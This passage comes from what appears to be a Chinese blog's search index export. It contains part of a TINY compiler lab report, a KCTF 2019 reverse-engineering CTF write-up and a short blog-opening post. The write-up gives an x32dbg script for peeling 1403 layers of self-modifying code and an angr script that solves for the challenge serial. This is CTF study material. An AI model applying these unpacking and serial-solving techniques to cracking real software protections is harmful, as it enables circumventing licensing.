d=0;                  do                  { c = input();                    if (c == '/'&&d==1)                    d=2;                    else if(c !='/'&&d==1)                     d=0;                    if (c == EOF) break;                    if (c == '\n') lineno++;                    if (c == '*') d=1;                  } while (d != 2);                }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111132822132.png" alt="image-20200111132822132"></p><h3 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h3><p>需要先修改tiny.l使其多识别一种符号</p><pre class="line-numbers language-C"><code class="language-C">"while"         {return WHILE;}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语法规则主要在YACC中，添加 while 语法在tiny.y文件中增加声明和定义</p><pre class="line-numbers language-C"><code class="language-C">%token WHILEwhile_stmt     : WHILE exp THEN stmt_seq END                 { $$ = newStmtNode(WHILEK);                   $$->child[0] = $2;                   $$->child[1] = $4;                 }            ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>newStmtNode(WHILEK)</code> </p><p>还需要修改<code>cgen</code>文件，增加对于<code>WHILEK</code>的处理</p><pre class="line-numbers language-c"><code class="language-c">      <span class="token keyword">case</span> WHILEK <span class="token punctuation">:</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>TraceCode<span class="token punctuation">)</span> <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"-> while"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         p1 <span class="token operator">=</span> tree<span class="token operator">-></span>child<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>         p2 <span class="token operator">=</span> tree<span class="token operator">-></span>child<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* generate code for test expression */</span>         savedLoc1 <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">cGen</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>         savedLoc2 <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"while: jump to else belongs here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">cGen</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">emitRM_Abs</span><span class="token punctuation">(</span><span class="token string">"LDA"</span><span class="token punctuation">,</span>pc<span class="token punctuation">,</span>savedLoc1<span class="token punctuation">,</span><span class="token string">"jmp to end"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* recurse on then part */</span>         currentLoc <span class="token operator">=</span> <span class="token function">emitSkip</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitBackup</span><span class="token punctuation">(</span>savedLoc2<span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token function">emitRM_Abs</span><span class="token punctuation">(</span><span class="token string">"JEQ"</span><span class="token punctuation">,</span>ac<span class="token punctuation">,</span>currentLoc<span class="token punctuation">,</span><span class="token string">"while: jmp to else"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">emitRestore</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>TraceCode<span class="token punctuation">)</span>  <span class="token function">emitComment</span><span class="token punctuation">(</span><span class="token string">"&lt;- while"</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>         <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* WHILEK_k */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>tny文件修改为,从10 倒序打印</p><pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">{</span> Sample program  in TINY language <span class="token operator">-</span>  computes factorial<span class="token punctuation">}</span>read x<span class="token comment" spellcheck="true">// sssss</span><span class="token comment" spellcheck="true">/* ddd */</span><span class="token punctuation">;</span> <span class="token punctuation">{</span> input an integer <span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">&lt;</span> x then <span class="token punctuation">{</span> don't compute <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">}</span>  fact <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  repeat    fact <span class="token punctuation">:</span><span class="token operator">=</span> fact <span class="token operator">*</span> x<span class="token punctuation">;</span>    x <span class="token punctuation">:</span><span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">1</span>  until x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  write fact  <span class="token punctuation">{</span> output factorial of x <span class="token punctuation">}</span>end<span class="token punctuation">;</span>y <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token number">0</span> <span class="token operator">&lt;</span> y then  y <span class="token punctuation">:</span><span class="token operator">=</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>  write yend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>语法树：</p><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111153138350.png" alt="image-20200111153138350"></p><p>运行的效果：</p><p><img src="%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20200111153205806.png" alt="image-20200111153205806"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>KCTF 总决赛第六题</title>
      <link href="/2019/12/30/kctf-zong-jue-sai-di-si-ti/"/>
      <url>/2019/12/30/kctf-zong-jue-sai-di-si-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="西部乐园-WP"><a href="#西部乐园-WP" class="headerlink" title="西部乐园 WP"></a>西部乐园 WP</h1><h1 id="第六题-三道八佛"><a href="#第六题-三道八佛" class="headerlink" title="第六题 三道八佛"></a>第六题 三道八佛</h1><blockquote><p>题目信息：Windows </p><p>题目来源：2019 看雪CTF总决赛</p></blockquote><p>题目是多层SMC完成的对于代码的加密，使用OD加载程序以后发现跑起来非常的卡。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111011819888.png" alt="image-20200111011819888"></p><p>由于SMC的代码量很大，所以在OD中不太好用，我选择了x32dbg。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111012429056.png" alt="image-20200111012429056"></p><p>由于采用了多层的smc，所以在ida中是无法直接分析算法的。</p><p>程序开头进行两个 <strong>VirtualProtect</strong> 进行修改.修改属性为可读写执行. 下面会不断的进行代码重定位.并且操作 <strong>FS:[4] FS:[8]</strong> 等来进行保存用户输入的UserName 以及 序列号</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/723188_7CW2JQEEDFDXY5Z.png" alt="img"></p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013459617.png" alt="image-20200111013459617"></p><p>动态跑起来，可以发现最初输入的KCTF 被填充了。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013823999.png" alt="image-20200111013823999"></p><p>下面的call eax 就是进行切换堆栈，并且跳入下一层smc 中。并且开始抹除原始代码。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111013943021.png" alt="image-20200111013943021"></p><pre><code>$calleax = 0$num = 0$jnzaddr = 0$f = 0$prevaddr = 0$retaddr=0$hasj=0bph 004014DFrun//input the username and passwordbphcstart:find cip,FFD0,0x200cmp $result,0je overmov $calleax,$resultbph $calleaxrunbphcinc $numStepIntoStepIntoStepOvermov $jnzaddr,cipfind_jnz:find cip,8BE55DC3,0x220cmp $result,0je nobpmov $retaddr,$resultbph $retaddr+3runbphcStepIntoStepIntoinc $nummov $jnzaddr,cipnobp:find jnzaddr,75??,0x200cmp $result,0jnz isjnzjnzs:find cip,0F85????????,0x200cmp $result,0jnz isjnzsjmp nofoundruntojnz:mov f,0bph $jnzaddr+2mov $hasj,1jmp jnzsruntojnzs:mov f,0mov $jnzaddr,$resultbph $jnzaddr+6runbphc mov $hasj,0nofound:cmp $hasj,1jnz nojumpmov $hasj,0runbphcnojump:jmp startisjnz:mov $jnzaddr,$result$prevaddr = dis.prev($jnzaddr)$prevaddr = $prevaddr + dis.len($prevaddr)cmp $prevaddr,$jnzaddrje runtojnzadd $jnzaddr,2jmp find_jnzisjnzs:mov $jnzaddr,$result$prevaddr = dis.prev($jnzaddr)$prevaddr = $prevaddr + dis.len($prevaddr)cmp $prevaddr,$jnzaddrje runtojnzscmp $hasj,1jnz nojjmp nofoundnoj:add $jnzaddr,2jmp find_jnzover:cmp f,0jnz endmov f,1jnzaddr=cipjmp find_jnzend:log decryptnum:{$num}msg &quot;over&quot;</code></pre><p>通过比对进入smc时的特征，使用x32dbg脚本，跑完发现有1403层smc，用脚本跑到最后一层，发现下面的代码是完整的函数，代码很长，还有很多重定位和混淆，故先全部提取到code文件并修正一下esi。</p><p>用IDA分析code文件，先修改基址为0x1A1857E，F5代码如下。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111014720242.png" alt="image-20200111014720242"></p><p>代码比较清晰了，serial经过计算，跟用户名比较，如果相同则成功。</p><p>注意KCTF用户名不足16位，后面的填充数据也是要比较的。也就是说实际上比较的是</p><blockquote><p>4B 43 54 46 00 1A 19 18 17 16 15 14 13 12 11 10 00</p></blockquote><p>因为代码还是有点看不太懂的，所以提取反编译以后的代码，放到VS中重新编译成exe以后使用angr跑出来flag。  angr 的python代码如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">import</span> angr<span class="token keyword">import</span> claripy<span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    load_option <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    b <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"./ConsoleApplication21.exe"</span><span class="token punctuation">,</span> load_options<span class="token operator">=</span>load_option<span class="token punctuation">)</span>    state <span class="token operator">=</span> b<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x401040</span><span class="token punctuation">)</span>    concrete_addr <span class="token operator">=</span> <span class="token number">0x404378</span>    flag_chars <span class="token operator">=</span> <span class="token punctuation">[</span>claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'flag_%d'</span> <span class="token operator">%</span> i<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    flag <span class="token operator">=</span> claripy<span class="token punctuation">.</span>Concat<span class="token punctuation">(</span><span class="token operator">*</span>flag_chars<span class="token punctuation">)</span>    state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>concrete_addr<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>    sm <span class="token operator">=</span> b<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>state<span class="token punctuation">)</span>    <span class="token keyword">print</span> sm<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x4013A3</span><span class="token punctuation">)</span>    found <span class="token operator">=</span> sm<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    temp <span class="token operator">=</span> <span class="token punctuation">(</span>found<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> temp    solution <span class="token operator">=</span> found<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>eval<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> cast_to<span class="token operator">=</span>str<span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> solution<span class="token punctuation">:</span>        s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> s    <span class="token keyword">print</span> solution<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span>    <span class="token keyword">print</span> flag<span class="token punctuation">,</span> found<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后成功跑出结果。</p><p><img src="kctf-%E6%80%BB%E5%86%B3%E8%B5%9B%E7%AC%AC%E5%9B%9B%E9%A2%98.assets/image-20200111014829398.png" alt="image-20200111014829398"></p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> 看雪CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hookme</title>
      <link href="/2019/12/26/hookme/"/>
      <url>/2019/12/26/hookme/</url>
      
        <content type="html"><![CDATA[<h1 id="新的博客开始啦"><a href="#新的博客开始啦" class="headerlink" title="新的博客开始啦~"></a>新的博客开始啦~</h1><p>认真整理东西！！！ 冲！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
